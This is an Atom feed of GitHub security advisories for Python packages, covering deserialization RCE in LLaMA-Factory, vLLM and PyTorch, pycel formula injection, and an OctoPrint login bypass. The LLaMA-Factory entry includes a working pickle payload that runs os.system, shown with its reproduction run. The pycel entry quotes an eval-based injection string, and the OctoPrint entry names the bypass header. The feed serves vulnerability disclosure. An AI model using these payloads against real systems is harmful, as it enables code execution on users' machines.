<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
    <id>https://azu.github.io/github-advisory-database-rss/pip.rss</id>
    <title>Security Advisory for Python packages hosted at PyPI.org</title>
    <updated>2025-04-24T11:01:21.041Z</updated>
    <generator>github-advisory-database-rss</generator>
    <link rel="alternate" href="https://github.com/advisories?query=type%3Areviewed+ecosystem%3Apip"/>
    <subtitle>Security Advisory for Python packages hosted at PyPI.org on GitHub</subtitle>
    <rights>github-advisory-database-rss</rights>
    <category term="CRITICAL"/>
    <category term="HIGH"/>
    <category term="MODERATE"/>
    <category term="LOW"/>
    <entry>
        <title type="html"><![CDATA[[llamafactory] LLaMA-Factory Allows Arbitrary Code Execution via Unsafe Deserialization in Ilamafy_baichuan2.py]]></title>
        <id>https://github.com/advisories/GHSA-f2f7-gj54-6vpv</id>
        <link href="https://github.com/advisories/GHSA-f2f7-gj54-6vpv"/>
        <updated>2025-04-23T22:21:14.000Z</updated>
        <content type="html"><![CDATA[<h3 id="description">Description</h3>
<p>A critical vulnerability exists in the <code>llamafy_baichuan2.py</code> script of the <a href="https://github.com/hiyouga/LLaMA-Factory">LLaMA-Factory</a> project. The script performs insecure deserialization using <code>torch.load()</code> on user-supplied <code>.bin</code> files from an input directory. An attacker can exploit this behavior by crafting a malicious <code>.bin</code> file that executes arbitrary commands during deserialization.</p>
<h3 id="attack-vector">Attack Vector</h3>
<p>This vulnerability is <strong>exploitable without authentication or privileges</strong> when a user is tricked into:</p>
<ol>
<li>Downloading or cloning a malicious project folder containing a crafted <code>.bin</code> file (e.g. via zip file, GitHub repo).</li>
<li>Running the provided conversion script <code>llamafy_baichuan2.py</code>, either manually or as part of an example workflow.</li>
</ol>
<p>No elevated privileges are required. The user only needs to run the script with an attacker-supplied <code>--input_dir</code>. </p>
<h3 id="impact">Impact</h3>
<ul>
<li>Arbitrary command execution (RCE)</li>
<li>System compromise</li>
<li>Persistence or lateral movement in shared compute environments</li>
</ul>
<h3 id="proof-of-concept-poc">Proof of Concept (PoC)</h3>
<pre><code class="language-python"># malicious_payload.py
import torch, pickle, os

class MaliciousPayload:
    def __reduce__(self):
        return (os.system, ("mkdir HACKED!",))  # Arbitrary command

malicious_data = {
    "v_head.summary.weight": MaliciousPayload(),
    "v_head.summary.bias": torch.randn(10)
}

with open("value_head.bin", "wb") as f:
    pickle.dump(malicious_data, f)
</code></pre>
<p>An example of <code>config.json</code>:</p>
<pre><code class="language-json">{
  "model": "value_head.bin",
  "hidden_size": 4096,
  "num_attention_heads": 32,
  "num_hidden_layers": 24,
  "initializer_range": 0.02,
  "intermediate_size": 11008,
  "max_position_embeddings": 4096,
  "kv_channels": 128,
  "layer_norm_epsilon": 1e-5,
  "tie_word_embeddings": false,
  "vocab_size": 151936
}
</code></pre>
<pre><code class="language-bash">(base) root@d6ab70067470:~/LLaMA-Factory_latest# tree
.
`-- LLaMA-Factory
    |-- LICENSE
    |-- README.md
    |-- malicious_folder
    |   |-- config.json
    |   `-- value_head.bin
    `-- xxxxx(Irrelevant documents omitted)
</code></pre>
<pre><code class="language-bash"># Reproduction
python scripts/convert_ckpt/llamafy_baichuan2.py --input_dir ./malicious_folder --output_dir ./out
</code></pre>
<p>➡️ Running this will execute the malicious payload and create a <code>HACKED!</code> folder.</p>
<pre><code class="language-bash">(base) root@d6ab70067470:~/LLaMA-Factory_latest/LLaMA-Factory# ls
CITATION.cff  LICENSE  MANIFEST.in  Makefile  README.md  README_zh.md  assets  data  docker  evaluation  examples  malicious_folder  pyproject.toml  requirements.txt  scripts  setup.py  src  tests
(base) root@d6ab70067470:~/LLaMA-Factory_latest/LLaMA-Factory# python scripts/convert_ckpt/llamafy_baichuan2.py --input_dir ./malicious_folder --output_dir ./out
2025-04-23 07:36:58.435304: E external/local_xla/xla/stream_executor/cuda/cuda_fft.cc:477] Unable to register cuFFT factory: Attempting to register factory for plugin cuFFT when one has already been registered
WARNING: All log messages before absl::InitializeLog() is called are written to STDERR
E0000 00:00:1745393818.451398    1008 cuda_dnn.cc:8310] Unable to register cuDNN factory: Attempting to register factory for plugin cuDNN when one has already been registered
E0000 00:00:1745393818.456423    1008 cuda_blas.cc:1418] Unable to register cuBLAS factory: Attempting to register factory for plugin cuBLAS when one has already been registered
2025-04-23 07:36:58.472951: I tensorflow/core/platform/cpu_feature_guard.cc:210] This TensorFlow binary is optimized to use available CPU instructions in performance-critical operations.
To enable the following instructions: AVX2 FMA, in other operations, rebuild TensorFlow with the appropriate compiler flags.
Load weights:  50%|██████████████████████████████████████████████████████████████████████████████████▌                                                                                  | 1/2 [00:00&lt;00:00, 123.70it/s]
Traceback (most recent call last):
  File "/root/LLaMA-Factory_latest/LLaMA-Factory/scripts/convert_ckpt/llamafy_baichuan2.py", line 112, in &lt;module&gt;
    fire.Fire(llamafy_baichuan2)
  File "/root/miniconda3/lib/python3.12/site-packages/fire/core.py", line 135, in Fire
    component_trace = _Fire(component, args, parsed_flag_args, context, name)
                      ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
  File "/root/miniconda3/lib/python3.12/site-packages/fire/core.py", line 468, in _Fire
    component, remaining_args = _CallAndUpdateTrace(
                                ^^^^^^^^^^^^^^^^^^^^
  File "/root/miniconda3/lib/python3.12/site-packages/fire/core.py", line 684, in _CallAndUpdateTrace
    component = fn(*varargs, **kwargs)
                ^^^^^^^^^^^^^^^^^^^^^^
  File "/root/LLaMA-Factory_latest/LLaMA-Factory/scripts/convert_ckpt/llamafy_baichuan2.py", line 107, in llamafy_baichuan2
    save_weight(input_dir, output_dir, shard_size, save_safetensors)
  File "/root/LLaMA-Factory_latest/LLaMA-Factory/scripts/convert_ckpt/llamafy_baichuan2.py", line 35, in save_weight
    shard_weight = torch.load(os.path.join(input_dir, filepath), map_location="cpu")
                   ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
  File "/root/miniconda3/lib/python3.12/site-packages/torch/serialization.py", line 1040, in load
    return _legacy_load(opened_file, map_location, pickle_module, **pickle_load_args)
           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
  File "/root/miniconda3/lib/python3.12/site-packages/torch/serialization.py", line 1260, in _legacy_load
    raise RuntimeError("Invalid magic number; corrupt file?")
RuntimeError: Invalid magic number; corrupt file?
(base) root@d6ab70067470:~/LLaMA-Factory_latest/LLaMA-Factory# ls
 CITATION.cff   LICENSE       Makefile    README_zh.md   data     evaluation   malicious_folder   pyproject.toml     scripts    src
'HACKED!'       MANIFEST.in   README.md   assets         docker   examples     out                requirements.txt   setup.py   tests
</code></pre>
<h3 id="affected-files">Affected File(s)</h3>
<ul>
<li><a href="https://github.com/hiyouga/LLaMA-Factory/blob/main/scripts/convert_ckpt/llamafy_baichuan2.py#L35">https://github.com/hiyouga/LLaMA-Factory/blob/main/scripts/convert_ckpt/llamafy_baichuan2.py#L35</a></li>
<li><code>scripts/convert_ckpt/llamafy_baichuan2.py</code></li>
<li>Line: <code>torch.load(os.path.join(input_dir, filepath), map_location="cpu")</code></li>
</ul>
<h3 id="suggested-fix">Suggested Fix</h3>
<ul>
<li>Replace <code>torch.load()</code> with safer alternatives like <code>safetensors</code>.</li>
<li>Validate and whitelist file types before deserialization.</li>
<li>Require checksum validation.</li>
</ul>
<p>Example patch:</p>
<pre><code class="language-python"># Replace torch.load() with safe deserialization
try:
    from safetensors.torch import load_file
    tensor_data = load_file(filepath)
except Exception:
    print("Invalid or unsafe checkpoint file.")
    return
</code></pre>
<h3 id="workarounds">Workarounds</h3>
<ul>
<li>Avoid running the script with untrusted <code>.bin</code> files.</li>
<li>Use containers or VMs to isolate script execution.</li>
</ul>
<h3 id="references">References</h3>
<ul>
<li><a href="https://pytorch.org/docs/stable/generated/torch.load.html">torch.load() — PyTorch Docs</a></li>
<li><a href="https://cwe.mitre.org/data/definitions/502.html">CWE-502: Deserialization of Untrusted Data</a></li>
</ul>
<h3 id="credits">Credits</h3>
<p>Discovered and reported by <a href="https://github.com/Anchor0221">Yu Rong</a> and <a href="https://github.com/xhjy2020">Hao Fan</a>, 2025-04-23</p>
<h3 id="references-1">References</h3>
<ul>
<li><a href="https://github.com/hiyouga/LLaMA-Factory/security/advisories/GHSA-f2f7-gj54-6vpv">https://github.com/hiyouga/LLaMA-Factory/security/advisories/GHSA-f2f7-gj54-6vpv</a></li>
<li><a href="https://github.com/hiyouga/LLaMA-Factory/commit/2989d39239d2f46e584c1e1180ba46b9768afb2a">https://github.com/hiyouga/LLaMA-Factory/commit/2989d39239d2f46e584c1e1180ba46b9768afb2a</a></li>
<li><a href="https://github.com/hiyouga/LLaMA-Factory/blob/main/scripts/convert_ckpt/llamafy_baichuan2.py#L35">https://github.com/hiyouga/LLaMA-Factory/blob/main/scripts/convert_ckpt/llamafy_baichuan2.py#L35</a></li>
<li><a href="https://github.com/advisories/GHSA-f2f7-gj54-6vpv">https://github.com/advisories/GHSA-f2f7-gj54-6vpv</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-f2f7-gj54-6vpv</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2025-04-23T22:21:13.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[lmdeploy] InternLM LMDeploy code injection vulnerability]]></title>
        <id>https://github.com/advisories/GHSA-jfvg-qm4p-473x</id>
        <link href="https://github.com/advisories/GHSA-jfvg-qm4p-473x"/>
        <updated>2025-04-23T19:37:40.000Z</updated>
        <content type="html"><![CDATA[<p>A vulnerability was found in InternLM LMDeploy up to 0.7.1. It has been declared as critical. Affected by this vulnerability is the function Open of the file lmdeploy/docs/en/conf.py. The manipulation leads to code injection. It is possible to launch the attack on the local host. The exploit has been disclosed to the public and may be used.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2025-3163">https://nvd.nist.gov/vuln/detail/CVE-2025-3163</a></li>
<li><a href="https://github.com/InternLM/lmdeploy/issues/3254">https://github.com/InternLM/lmdeploy/issues/3254</a></li>
<li><a href="https://github.com/InternLM/lmdeploy/issues/3254#issue-2918865448">https://github.com/InternLM/lmdeploy/issues/3254#issue-2918865448</a></li>
<li><a href="https://vuldb.com/?ctiid.303109">https://vuldb.com/?ctiid.303109</a></li>
<li><a href="https://vuldb.com/?id.303109">https://vuldb.com/?id.303109</a></li>
<li><a href="https://vuldb.com/?submit.542527">https://vuldb.com/?submit.542527</a></li>
<li><a href="https://github.com/advisories/GHSA-jfvg-qm4p-473x">https://github.com/advisories/GHSA-jfvg-qm4p-473x</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-jfvg-qm4p-473x</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2025-04-03T18:30:58.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[vllm] CVE-2025-24357 Malicious model remote code execution fix bypass with PyTorch < 2.6.0]]></title>
        <id>https://github.com/advisories/GHSA-ggpf-24jw-3fcw</id>
        <link href="https://github.com/advisories/GHSA-ggpf-24jw-3fcw"/>
        <updated>2025-04-23T02:26:07.000Z</updated>
        <content type="html"><![CDATA[<h2 id="description">Description</h2>
<p><a href="https://github.com/vllm-project/vllm/security/advisories/GHSA-rh4j-5rhw-hr54">https://github.com/vllm-project/vllm/security/advisories/GHSA-rh4j-5rhw-hr54</a> reported a vulnerability where loading a malicious model could result in code execution on the vllm host. The fix applied to specify <code>weights_only=True</code> to calls to <code>torch.load()</code> did not solve the problem prior to PyTorch 2.6.0.</p>
<p>PyTorch has issued a new CVE about this problem: <a href="https://github.com/advisories/GHSA-53q9-r3pm-6pq6">https://github.com/advisories/GHSA-53q9-r3pm-6pq6</a></p>
<p>This means that versions of vLLM using PyTorch before 2.6.0 are vulnerable to this problem.</p>
<h2 id="background-knowledge">Background Knowledge</h2>
<p>When users install VLLM according to the official manual
<img alt="image" src="https://github.com/user-attachments/assets/d17e0bdb-26f2-46d6-adf6-0b17e5ddf5c7"></p>
<p>But the version of PyTorch is specified in the requirements. txt file
<img alt="image" src="https://github.com/user-attachments/assets/94aad622-ad6d-4741-b772-c342727c58c7"></p>
<p>So by default when the user install VLLM, it will install the PyTorch with version 2.5.1
<img alt="image" src="https://github.com/user-attachments/assets/04ff31b0-aad1-490a-963d-00fda91da47b"></p>
<p>In CVE-2025-24357, weights_only=True was used for patching, but we know this is not secure.
Because we found that using Weights_only=True in pyTorch before 2.5.1 was unsafe</p>
<p>Here, we use this interface to prove that it is not safe.
<img alt="image" src="https://github.com/user-attachments/assets/0d86efcd-2aad-42a2-8ac6-cc96b054c925"></p>
<h2 id="fix">Fix</h2>
<p>update PyTorch version to 2.6.0</p>
<h2 id="credit">Credit</h2>
<p>This vulnerability was found By Ji'an Zhou and Li'shuo Song</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/pytorch/pytorch/security/advisories/GHSA-53q9-r3pm-6pq6">https://github.com/pytorch/pytorch/security/advisories/GHSA-53q9-r3pm-6pq6</a></li>
<li><a href="https://github.com/vllm-project/vllm/security/advisories/GHSA-ggpf-24jw-3fcw">https://github.com/vllm-project/vllm/security/advisories/GHSA-ggpf-24jw-3fcw</a></li>
<li><a href="https://github.com/vllm-project/vllm/security/advisories/GHSA-rh4j-5rhw-hr54">https://github.com/vllm-project/vllm/security/advisories/GHSA-rh4j-5rhw-hr54</a></li>
<li><a href="https://github.com/advisories/GHSA-ggpf-24jw-3fcw">https://github.com/advisories/GHSA-ggpf-24jw-3fcw</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-ggpf-24jw-3fcw</uri>
        </author>
        <category label="severity" term="CRITICAL"/>
        <published>2025-04-23T02:26:06.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[OpenEXR] OpenEXR invalid read]]></title>
        <id>https://github.com/advisories/GHSA-8m57-j273-2qg9</id>
        <link href="https://github.com/advisories/GHSA-8m57-j273-2qg9"/>
        <updated>2025-04-22T18:45:45.000Z</updated>
        <content type="html"><![CDATA[<p>In OpenEXR 2.2.0, an invalid read of size 1 in the getBits function in ImfHuf.cpp could cause the application to crash.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2017-9112">https://nvd.nist.gov/vuln/detail/CVE-2017-9112</a></li>
<li><a href="https://github.com/openexr/openexr/issues/232">https://github.com/openexr/openexr/issues/232</a></li>
<li><a href="https://github.com/openexr/openexr/pull/233">https://github.com/openexr/openexr/pull/233</a></li>
<li><a href="https://github.com/openexr/openexr/releases/tag/v2.2.1">https://github.com/openexr/openexr/releases/tag/v2.2.1</a></li>
<li><a href="https://lists.debian.org/debian-lts-announce/2020/08/msg00056.html">https://lists.debian.org/debian-lts-announce/2020/08/msg00056.html</a></li>
<li><a href="http://www.openwall.com/lists/oss-security/2017/05/12/5">http://www.openwall.com/lists/oss-security/2017/05/12/5</a></li>
<li><a href="https://usn.ubuntu.com/4148-1">https://usn.ubuntu.com/4148-1</a></li>
<li><a href="https://github.com/advisories/GHSA-8m57-j273-2qg9">https://github.com/advisories/GHSA-8m57-j273-2qg9</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-8m57-j273-2qg9</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2022-05-13T01:17:50.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[OpenEXR] OpenEXR invalid write]]></title>
        <id>https://github.com/advisories/GHSA-qxh9-r8xw-7v99</id>
        <link href="https://github.com/advisories/GHSA-qxh9-r8xw-7v99"/>
        <updated>2025-04-22T18:45:30.000Z</updated>
        <content type="html"><![CDATA[<p>In OpenEXR 2.2.0, an invalid write of size 8 in the storeSSE function in ImfOptimizedPixelReading.h could cause the application to crash or execute arbitrary code.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2017-9111">https://nvd.nist.gov/vuln/detail/CVE-2017-9111</a></li>
<li><a href="https://github.com/openexr/openexr/issues/232">https://github.com/openexr/openexr/issues/232</a></li>
<li><a href="https://github.com/openexr/openexr/pull/233">https://github.com/openexr/openexr/pull/233</a></li>
<li><a href="https://github.com/openexr/openexr/releases/tag/v2.2.1">https://github.com/openexr/openexr/releases/tag/v2.2.1</a></li>
<li><a href="https://lists.debian.org/debian-lts-announce/2020/08/msg00056.html">https://lists.debian.org/debian-lts-announce/2020/08/msg00056.html</a></li>
<li><a href="https://www.debian.org/security/2020/dsa-4755">https://www.debian.org/security/2020/dsa-4755</a></li>
<li><a href="http://lists.opensuse.org/opensuse-security-announce/2019-07/msg00060.html">http://lists.opensuse.org/opensuse-security-announce/2019-07/msg00060.html</a></li>
<li><a href="http://lists.opensuse.org/opensuse-security-announce/2019-08/msg00000.html">http://lists.opensuse.org/opensuse-security-announce/2019-08/msg00000.html</a></li>
<li><a href="http://www.openwall.com/lists/oss-security/2017/05/12/5">http://www.openwall.com/lists/oss-security/2017/05/12/5</a></li>
<li><a href="https://usn.ubuntu.com/4148-1">https://usn.ubuntu.com/4148-1</a></li>
<li><a href="https://usn.ubuntu.com/4339-1">https://usn.ubuntu.com/4339-1</a></li>
<li><a href="https://github.com/advisories/GHSA-qxh9-r8xw-7v99">https://github.com/advisories/GHSA-qxh9-r8xw-7v99</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-qxh9-r8xw-7v99</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2022-05-13T01:17:50.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[pycel] Pycel allows code injection via a crafted formula]]></title>
        <id>https://github.com/advisories/GHSA-pw67-xjhq-389w</id>
        <link href="https://github.com/advisories/GHSA-pw67-xjhq-389w"/>
        <updated>2025-04-22T17:04:12.000Z</updated>
        <content type="html"><![CDATA[<p>Pycel through 1.0b30, when operating on an untrusted spreadsheet, allows code execution via a crafted formula in a cell, such as one beginning with the <code>=IF(A1=200, eval("__import__('os').system(</code> substring.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-53924">https://nvd.nist.gov/vuln/detail/CVE-2024-53924</a></li>
<li><a href="https://gist.github.com/aelmosalamy/cb098e61939718d2bb248fd1cc94f287">https://gist.github.com/aelmosalamy/cb098e61939718d2bb248fd1cc94f287</a></li>
<li><a href="https://github.com/dgorissen/pycel">https://github.com/dgorissen/pycel</a></li>
<li><a href="https://github.com/stephenrauch/pycel">https://github.com/stephenrauch/pycel</a></li>
<li><a href="https://pypi.org/project/pycel">https://pypi.org/project/pycel</a></li>
<li><a href="https://github.com/advisories/GHSA-pw67-xjhq-389w">https://github.com/advisories/GHSA-pw67-xjhq-389w</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-pw67-xjhq-389w</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2025-04-17T18:31:23.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[octoprint] OctoPrint Authenticated Reverse Proxy Page Authentication Bypass]]></title>
        <id>https://github.com/advisories/GHSA-qw93-h6pf-226x</id>
        <link href="https://github.com/advisories/GHSA-qw93-h6pf-226x"/>
        <updated>2025-04-23T15:20:11.000Z</updated>
        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
<p>OctoPrint versions up until and including 1.10.3 contain a vulnerability that allows an attacker to bypass the login redirect and directly access the rendered HTML of certain frontend pages. </p>
<p>The impact on data exposure is minimal because, typically, data is loaded via API requests that correctly enforce user authentication. In the current codebase, cases where data is directly embedded in the page content are rare. However, one notable exception is the authenticated variant of the reverse proxy test page, which displays the IP addresses of configured reverse proxies. </p>
<p>The primary risk lies in potential future modifications to the codebase that might incorrectly rely on the vulnerable internal functions for authentication checks, leading to security vulnerabilities.</p>
<h3 id="patches">Patches</h3>
<p>The vulnerability has been patched in version 1.11.0.</p>
<h3 id="details">Details</h3>
<p>An authentication bypass vulnerability exists in the following functions defined in <a href="https://github.com/OctoPrint/OctoPrint/blob/d79a0d20f3f1c7f2edb56dedda3b70267a937e65/src/octoprint/server/util/__init__.py">octoprint/server/util/init.py</a>:</p>
<ul>
<li><code>require_login</code></li>
<li><code>require_login_with</code></li>
<li><code>require_fresh_login_with</code></li>
</ul>
<p>By adding the HTTP header <code>X-Preemptive-Recording: yes</code> to HTTP requests, these functions allow requests to proceed without redirecting to the login screen, effectively bypassing the login mechanism in the frontend. However, this only grants access to frontend page content, while authenticated API endpoints still enforce proper session validation.</p>
<h3 id="credits">Credits</h3>
<p>This vulnerability was discovered and responsibly disclosed to OctoPrint by Jacopo Tediosi</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/OctoPrint/OctoPrint/security/advisories/GHSA-qw93-h6pf-226x">https://github.com/OctoPrint/OctoPrint/security/advisories/GHSA-qw93-h6pf-226x</a></li>
<li><a href="https://github.com/OctoPrint/OctoPrint/commit/41ff431014edfa18ca1a01897b10463934dc7fc2">https://github.com/OctoPrint/OctoPrint/commit/41ff431014edfa18ca1a01897b10463934dc7fc2</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2025-32788">https://nvd.nist.gov/vuln/detail/CVE-2025-32788</a></li>
<li><a href="https://github.com/advisories/GHSA-qw93-h6pf-226x">https://github.com/advisories/GHSA-qw93-h6pf-226x</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-qw93-h6pf-226x</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2025-04-22T16:49:43.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[web2py] Web2py Reflected XSS vulnerability]]></title>
        <id>https://github.com/advisories/GHSA-pvcp-73cg-6f77</id>
        <link href="https://github.com/advisories/GHSA-pvcp-73cg-6f77"/>
        <updated>2025-04-21T22:52:17.000Z</updated>
        <content type="html"><![CDATA[<p>Web2py versions 2.14.5 and below was affected by Reflected XSS vulnerability, which allows an attacker to perform an XSS attack on logged in user (admin).</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2016-4807">https://nvd.nist.gov/vuln/detail/CVE-2016-4807</a></li>
<li><a href="http://packetstormsecurity.com/files/137070/Web2py-2.14.5-CSRF-XSS-Local-File-Inclusion.html">http://packetstormsecurity.com/files/137070/Web2py-2.14.5-CSRF-XSS-Local-File-Inclusion.html</a></li>
<li><a href="https://www.exploit-db.com/exploits/39821">https://www.exploit-db.com/exploits/39821</a></li>
<li><a href="https://github.com/advisories/GHSA-pvcp-73cg-6f77">https://github.com/advisories/GHSA-pvcp-73cg-6f77</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-pvcp-73cg-6f77</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2022-05-17T03:05:11.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[Crawl4AI] Crawl4AI SSRF vulnerability]]></title>
        <id>https://github.com/advisories/GHSA-445m-27cf-gr3x</id>
        <link href="https://github.com/advisories/GHSA-445m-27cf-gr3x"/>
        <updated>2025-04-21T21:54:26.000Z</updated>
        <content type="html"><![CDATA[<p>Crawl4AI &lt;=0.4.247 is vulnerable to SSRF in /crawl4ai/async_dispatcher.py.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2025-28197">https://nvd.nist.gov/vuln/detail/CVE-2025-28197</a></li>
<li><a href="https://gist.github.com/AndrewDzzz/f49e79b09ce0643ee1fc2a829e8875e0">https://gist.github.com/AndrewDzzz/f49e79b09ce0643ee1fc2a829e8875e0</a></li>
<li><a href="https://github.com/advisories/GHSA-445m-27cf-gr3x">https://github.com/advisories/GHSA-445m-27cf-gr3x</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-445m-27cf-gr3x</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2025-04-18T21:31:20.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[youtube-dl] youtube-dl vulnerable to file system modification and RCE through improper file-extension sanitization]]></title>
        <id>https://github.com/advisories/GHSA-22fp-mf44-f2mq</id>
        <link href="https://github.com/advisories/GHSA-22fp-mf44-f2mq"/>
        <updated>2025-04-18T20:24:10.000Z</updated>
        <content type="html"><![CDATA[<h4 id="description">Description</h4>
<p>This advisory follows the security advisory <a href="https://github.com/yt-dlp/yt-dlp/security/advisories/GHSA-79w7-vh3h-8g4j">GHSA-79w7-vh3h-8g4j published by the <em>yt-dlp/yt-dlp</em> project</a> to aid remediation of the issue in the <em>ytdl-org/youtube-dl</em> project.</p>
<h3 id="vulnerability">Vulnerability</h3>
<p><em>youtube-dl</em> does not limit the extensions of downloaded files, which could lead to arbitrary filenames being created in the download folder (and path traversal on Windows). </p>
<h3 id="impact">Impact</h3>
<p>Since <em>youtube-dl</em> also reads config from the working directory (and, on Windows, executables will be executed from the <em>youtube-dl</em> directory by default) the vulnerability could allow the unwanted execution of local code, including downloads masquerading as, eg, subtitles.</p>
<h3 id="patches">Patches</h3>
<p>The versions of <em>youtube-dl</em> listed as <em>Patched</em> remediate this vulnerability by disallowing path separators and whitelisting allowed extensions. As a result, some very uncommon extensions might not get downloaded.</p>
<h3 id="workarounds">Workarounds</h3>
<p>Any/all of the below considerations may limit exposure in case it is necessary to use a vulnerable version</p>
<ul>
<li>have <code>.%(ext)s</code> at the end of the output template</li>
<li>download from websites that you trust</li>
<li>do not download to a directory within the executable search <code>PATH</code> or other sensitive locations, such as your user directory or system directories</li>
<li>in Windows versions that support it, set <a href="https://stackoverflow.com/a/50118548"><code>NoDefaultCurrentDirectoryInExePath</code></a> to prevent the <em>cmd</em> shell's executable search adding the default directory before <code>PATH</code></li>
<li>consider that the path traversal vulnerability as a result of resolving <code>non_existent_dir\..\..\target</code> does not exist in Linux or macOS</li>
<li>ensure the extension of the media to download is a common video/audio/... one (use <code>--get-filename</code>)</li>
<li>omit any of the subtitle options (<code>--write-subs</code>/<code> --write-srt</code>, <code>--write-auto-subs</code>/<code>--write-automatic-subs</code>, <code>--all-subs</code>).</li>
</ul>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/yt-dlp/yt-dlp/security/advisories/GHSA-79w7-vh3h-8g4j">GHSA-79w7-vh3h-8g4j</a></li>
<li><a href="https://github.com/ytdl-org/youtube-dl/pull/32830">https://github.com/ytdl-org/youtube-dl/pull/32830</a></li>
</ul>
<h3 id="references-1">References</h3>
<ul>
<li><a href="https://github.com/dirkf/youtube-dl/security/advisories/GHSA-22fp-mf44-f2mq">https://github.com/dirkf/youtube-dl/security/advisories/GHSA-22fp-mf44-f2mq</a></li>
<li><a href="https://github.com/yt-dlp/yt-dlp/security/advisories/GHSA-79w7-vh3h-8g4j">https://github.com/yt-dlp/yt-dlp/security/advisories/GHSA-79w7-vh3h-8g4j</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-38519">https://nvd.nist.gov/vuln/detail/CVE-2024-38519</a></li>
<li><a href="https://github.com/ytdl-org/youtube-dl/pull/32830">https://github.com/ytdl-org/youtube-dl/pull/32830</a></li>
<li><a href="https://github.com/ytdl-org/youtube-dl/commit/d42a222ed541b96649396ef00e19552aef0f09ec">https://github.com/ytdl-org/youtube-dl/commit/d42a222ed541b96649396ef00e19552aef0f09ec</a></li>
<li><a href="https://securitylab.github.com/advisories/GHSL-2024-089_youtube-dl">https://securitylab.github.com/advisories/GHSL-2024-089_youtube-dl</a></li>
<li><a href="https://github.com/advisories/GHSA-22fp-mf44-f2mq">https://github.com/advisories/GHSA-22fp-mf44-f2mq</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-22fp-mf44-f2mq</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2025-04-18T20:24:07.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[torch] PyTorch: `torch.load` with `weights_only=True` leads to remote code execution]]></title>
        <id>https://github.com/advisories/GHSA-53q9-r3pm-6pq6</id>
        <link href="https://github.com/advisories/GHSA-53q9-r3pm-6pq6"/>
        <updated>2025-04-18T18:34:25.000Z</updated>
        <content type="html"><![CDATA[<h1 id="description">Description</h1>
<p>I found a Remote Command Execution (RCE) vulnerability in the PyTorch. When load model using torch.load with weights_only=True, it can still achieve RCE.  </p>
<h1 id="background-knowledge">Background knowledge</h1>
<p><a href="https://github.com/pytorch/pytorch/security">https://github.com/pytorch/pytorch/security</a> 
 As you can see, the PyTorch official documentation considers using <code>torch.load()</code> with <code>weights_only=True</code> to be safe.
<img alt="image" src="https://github.com/user-attachments/assets/fdaa8520-d66a-473a-ab1f-163d793de298">
Since everyone knows that weights_only=False is unsafe, so they will use the  weights_only=True to mitigate the security issue.
But now, I just proved that even if you use weights_only=True, it still can achieve RCE.
So it is time to update your PyTorch version~.</p>
<h1 id="credit">Credit</h1>
